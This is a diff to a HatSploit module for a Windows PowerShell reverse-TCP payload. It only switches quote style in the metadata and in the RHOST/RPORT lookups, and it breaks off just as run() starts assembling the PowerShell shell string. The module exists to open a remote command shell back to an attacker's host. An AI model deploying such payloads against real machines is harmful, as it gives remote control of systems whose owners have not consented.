@@ -8,19 +8,19 @@ from hatsploit.lib.payload import Payload
 
 class HatSploitPayload(Payload):
     details = {
-        "Name": "Windows PowerShell Reverse TCP",
-        "Payload": "windows/generic/powershell_reverse_tcp",
-        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
-        "Description": "Windows cmd.exe reverse TCP payload through PowerShell script.",
-        "Architecture": "generic",
-        "Platform": "windows",
-        "Rank": "high",
-        "Type": "reverse_tcp",
+        'Name': "Windows PowerShell Reverse TCP",
+        'Payload': "windows/generic/powershell_reverse_tcp",
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
+        'Description': "Windows cmd.exe reverse TCP payload through PowerShell script.",
+        'Architecture': "generic",
+        'Platform': "windows",
+        'Rank': "high",
+        'Type': "reverse_tcp",
     }
 
     def run(self):
-        remote_host = self.handler["RHOST"]
-        remote_port = self.handler["RPORT"]
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         source = (
             f"$a='{remote_host}';"
